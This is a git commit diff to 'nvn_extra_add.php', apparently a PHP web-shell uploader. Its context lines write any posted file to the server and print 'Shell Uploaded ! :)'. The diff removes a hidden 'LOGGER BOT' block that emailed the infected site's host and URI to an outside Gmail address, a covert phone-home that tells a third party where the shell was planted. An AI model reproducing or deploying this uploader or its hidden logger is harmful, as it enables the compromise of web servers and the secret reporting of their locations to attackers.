1e7c2121a41850c95584c61a04610af99cb9174b
LoliC0d3 <59540270+LoliC0d3@users.noreply.github.com>
2020-02-12 10:20:43 -0500

    Update nvn_extra_add.php

--- files/nvn_extra_add.php
+++ files/nvn_extra_add.php
@@ -7,8 +7,4 @@ if( $_POST['_upl'] == "Upload" ) {
 if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Shell Uploaded ! :)<b><br><br>'; }
 else { echo '<b>Not uploaded ! </b><br><br>'; }
 }
-$ra44  = rand(1,99999);$subj98 = "LOGGER BOT";
-$from="From: SHELL BOT<noreply@cs53.hostneverdie.com>";$b75 = $_SERVER['HTTP_HOST'];
-$a45 = $_SERVER['REQUEST_URI'];$email = "ternakayam333@gmail.com";
-$alfa = "LINK : $b75$a45";$msg8873 = "$alfa\n";
-mail($email, $subj98, $msg8873, $from);?>
+?>
